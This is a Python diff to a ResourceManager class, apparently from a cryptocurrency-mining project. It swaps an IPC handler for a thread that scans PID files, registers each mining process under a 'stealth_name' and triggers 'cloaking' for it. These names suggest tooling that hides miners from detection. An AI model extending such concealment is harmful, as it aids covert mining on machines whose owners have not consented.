@@ -264,6 +264,17 @@ class ResourceManager(IResourceManager):
                     module_logger.error(f"❌ [RM] Failed to initialize GPU Orchestrator: {e}")
                     self._gpu_orchestrator = None
             
+            # **🔍 FILE-BASED SCANNER** (quét file - giải pháp cross-process)
+            # Khởi tạo scanner thread để đọc PID files từ DirectPIDRegistry trong subprocess
+            self._scanner_stop_flag = False
+            self._scanner_thread = threading.Thread(
+                target=self._scan_pid_files,
+                daemon=True,
+                name="PIDFileScanner"
+            )
+            self._scanner_thread.start()
+            module_logger.info("✅ [FILE-SCANNER] PID file scanner thread started successfully")
+            
             self._initialized = True
             module_logger.info("**ResourceManager initialization successful** (ResourceManager khởi tạo thành công – thiết lập trình quản lý hoàn tất)")
 
@@ -368,103 +379,9 @@ class ResourceManager(IResourceManager):
                 self.logger.warning("⚠️ [IPC-ONLY] DirectPIDRegistry không hỗ trợ register_resource_manager")
             
         except Exception as e:
-            self.logger.error(f"❌ Lỗi thiết lập DirectPIDRegistry: {e}")
-
-    # ❌ IPC Bridge removed: no setup needed
-
-    # ❌ IPC removed: legacy handlers deleted for clean code
-    def _handle_ipc_pid_forward(self, ipc_message) -> bool:
-        """
-        **🔥 Handle IPC PID Forward** (xử lý chuyển tiếp PID qua IPC)
-        
-        CRITICAL METHOD: Cross-process PID forward handler thay thế singleton access.
-        Nhận PID từ subprocess DirectPIDRegistry và trigger cloaking trong main process.
-        
-        Args:
-            ipc_message: IPCMessage chứa PID và metadata
-            
-        Returns:
-            bool: True nếu xử lý thành công
-        """
-        try:
-            start_time = time.time()
-            self.logger.info(f"🎯 [IPC-HANDLER] Received cross-process PID forward: {ipc_message.message_id[:8]}")
-            
-            # IPC removed: skip stats updates
-            
-            # **Extract PID and metadata from message** (trích xuất PID và metadata từ tin nhắn)
-            payload = ipc_message.payload
-            pid = payload.get('pid')
-            metadata = payload.get('metadata', {})
-            source = payload.get('source', 'ipc_bridge')
-            
-            if not pid:
-                self.logger.error("❌ [IPC-HANDLER] No PID in message payload")
-                return False
-                
-            self.logger.info(f"📍 [IPC-HANDLER] Processing cross-process PID {pid}")
-            self.logger.debug(f"🔍 [IPC-HANDLER] Message metadata keys: {list(metadata.keys())}")
-            
-            # **Create MiningProcess object** (tạo đối tượng MiningProcess)
-            process_name = metadata.get('stealth_name', metadata.get('process_name', f'process_{pid}'))
-            cmd = metadata.get('cmd', [])
-            
-            mining_process = MiningProcess(
-                pid=pid,
-                name=process_name,
-                cmd=cmd
-            )
-            
-            self.logger.info(f"🔧 [IPC-HANDLER] Created MiningProcess: {mining_process.name}")
-            
-            # **Add IPC metadata for tracking** (thêm metadata IPC để tracking)
-            enhanced_metadata = {
-                **metadata,
-                'ipc_timestamp': time.time(),
-                'ipc_message_id': ipc_message.message_id,
-                'ipc_source_process': ipc_message.source_process,
-                'cross_process_forward': True,
-                'original_source': source
-            }
-            
-            # **Queue PID for processing** (queue PID để xử lý)
-            pid_data = {
-                'pid': pid,
-                'mining_process': mining_process,
-                'registry_metadata': enhanced_metadata,
-                'timestamp': time.time(),
-                'source': 'ipc_bridge_forward',
-                'ipc_enabled': True,
-                'message_id': ipc_message.message_id
-            }
-            
-            try:
-                self._pid_queue.put(pid_data, block=False)
-                self.logger.info(f"✅ [IPC-HANDLER] PID {pid} queued for processing via IPC")
-                self.logger.debug(f"🧪 [DIAG-RACE] Queue size after IPC put: {self._pid_queue.qsize()} (source=ipc_bridge_forward)")
-                
-                # **Log performance metrics** (ghi log metrics hiệu suất)
-                processing_time_ms = (time.time() - start_time) * 1000
-                self.logger.debug(f"⚡ [IPC-PERF] PID forward handled in {processing_time_ms:.1f}ms")
-                
-                return True
-                
-            except queue.Full:
-                self.logger.warning(f"⚠️ [IPC-HANDLER] PID queue full, processing immediately for PID {pid}")
-                
-                # **Immediate processing fallback** (dự phòng xử lý ngay lập tức)
-                success = self._process_pid_immediately(pid_data)
-                self.logger.info(f"📊 [IPC-HANDLER] Immediate processing result for PID {pid}: {success}")
-                
-                # Legacy stats removed
-                
-                return success
-                
-        except Exception as e:
-            self.logger.error(f"❌ [IPC-HANDLER] Error handling PID forward: {e}")
-            self.logger.error(f"🔍 [IPC-HANDLER] Traceback: {traceback.format_exc()}")
-            return False
+            self.logger.error(f"❌ Lỗi thiết lập DirectPIDRegistry: {e}")    
     
+    # IPC methods đã bị loại bỏ - giữ lại stub để tránh breaking changes
     def _handle_ipc_heartbeat(self, ipc_message) -> bool:
         """(Removed) IPC Heartbeat no-op"""
         return False
@@ -737,6 +654,129 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"🔍 [TIER-1] SharedResourceManager status: {getattr(self, 'shared_resource_manager', 'Not initialized')}")
             raise
 
+    def _scan_pid_files(self):
+        """
+        **FILE-BASED SCANNER** (quét file - giải pháp cross-process)
+        
+        Scan for PID files from subprocess DirectPIDRegistry.
+        Files are located in: /app/mining_environment/logs/ncs_pid_registry/
+        File format: pid_<PID>.json
+        """
+        import json
+        from pathlib import Path
+        
+        # Đường dẫn chính xác theo RegistryConfig
+        pid_registry_dir = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs')) / 'ncs_pid_registry'
+        
+        self.logger.info(f"📂 [FILE-SCANNER] Starting PID file scanner, monitoring: {pid_registry_dir}")
+        
+        while not self._scanner_stop_flag:
+            try:
+                # Tạo thư mục nếu chưa tồn tại
+                pid_registry_dir.mkdir(parents=True, exist_ok=True)
+                
+                # Tìm tất cả PID files
+                pid_files = list(pid_registry_dir.glob('pid_*.json'))
+                
+                if pid_files:
+                    self.logger.debug(f"🔍 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
+                
+                for pid_file in pid_files:
+                    try:
+                        # Đọc file JSON
+                        with open(pid_file, 'r') as f:
+                            data = json.load(f)
+                        
+                        # Extract PID và metadata
+                        pid = data.get('pid')
+                        metadata = data.get('metadata', {})
+                        timestamp = data.get('timestamp', time.time())
+                        
+                        self.logger.info(f"📄 [FILE-SCANNER] Processing PID file: {pid_file.name}, PID={pid}")
+                        self.logger.debug(f"🔍 [FILE-SCANNER] Metadata keys: {list(metadata.keys())}")
+                        
+                        # Tạo MiningProcess object
+                        process_name = metadata.get('stealth_name', metadata.get('process_name', f'process_{pid}'))
+                        cmd = metadata.get('cmd', [])
+                        
+                        mining_process = MiningProcess(
+                            pid=pid,
+                            name=process_name,
+                            cmd=cmd
+                        )
+                        
+                        # Thêm metadata để tracking
+                        enhanced_metadata = {
+                            **metadata,
+                            'file_scanner_timestamp': time.time(),
+                            'file_path': str(pid_file),
+                            'original_timestamp': timestamp,
+                            'cross_process_file': True,
+                            'source': 'file_scanner'
+                        }
+                        
+                        # Gọi receive_from_registry để xử lý PID
+                        self.logger.info(f"🚀 [FILE-SCANNER] Forwarding PID {pid} to registry handler")
+                        self.receive_from_registry(pid, enhanced_metadata)
+                        
+                        # Trigger cloaking nếu cần
+                        if metadata.get('cloaking_required', True):
+                            self.logger.info(f"🛡️ [FILE-SCANNER] Triggering cloaking for PID {pid}")
+                            self.trigger_cloaking(pid)
+                        
+                        # Xóa file sau khi xử lý thành công
+                        pid_file.unlink()
+                        self.logger.info(f"✅ [FILE-SCANNER] Successfully processed and removed: {pid_file.name}")
+                        
+                    except json.JSONDecodeError as je:
+                        self.logger.error(f"❌ [FILE-SCANNER] JSON decode error for {pid_file.name}: {je}")
+                        # Xóa file lỗi để tránh xử lý lại
+                        try:
+                            pid_file.unlink()
+                        except:
+                            pass
+                    except Exception as e:
+                        self.logger.error(f"❌ [FILE-SCANNER] Error processing {pid_file.name}: {e}")
+                        # Không xóa file nếu có lỗi khác, có thể retry
+                        
+            except Exception as e:
+                self.logger.error(f"❌ [FILE-SCANNER] Scanner error: {e}")
+            
+            # Sleep 500ms trước khi scan tiếp
+            time.sleep(0.5)
+        
+        self.logger.info("🛑 [FILE-SCANNER] PID file scanner stopped")
+
+    def _cleanup_old_pid_files(self):
+        """
+        **Cleanup Old PID Files** (dọn dẹp file PID cũ)
+        
+        Remove PID files older than 1 hour to prevent accumulation.
+        This is a maintenance task to keep the directory clean.
+        """
+        from pathlib import Path
+        
+        pid_registry_dir = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs')) / 'ncs_pid_registry'
+        current_time = time.time()
+        cleaned_count = 0
+        
+        try:
+            for pid_file in pid_registry_dir.glob('pid_*.json'):
+                try:
+                    file_age = current_time - pid_file.stat().st_mtime
+                    if file_age > 3600:  # 1 giờ
+                        pid_file.unlink()
+                        cleaned_count += 1
+                        self.logger.debug(f"🧹 [FILE-SCANNER] Cleaned old file: {pid_file.name} (age: {file_age:.0f}s)")
+                except Exception as e:
+                    self.logger.debug(f"⚠️ [FILE-SCANNER] Cleanup error for {pid_file.name}: {e}")
+            
+            if cleaned_count > 0:
+                self.logger.info(f"🧹 [FILE-SCANNER] Cleaned {cleaned_count} old PID files")
+                
+        except Exception as e:
+            self.logger.debug(f"⚠️ [FILE-SCANNER] Cleanup task error: {e}")
+ 
     def _start_workers(self):
         """**Start Worker Threads** (khởi động worker threads)"""
 
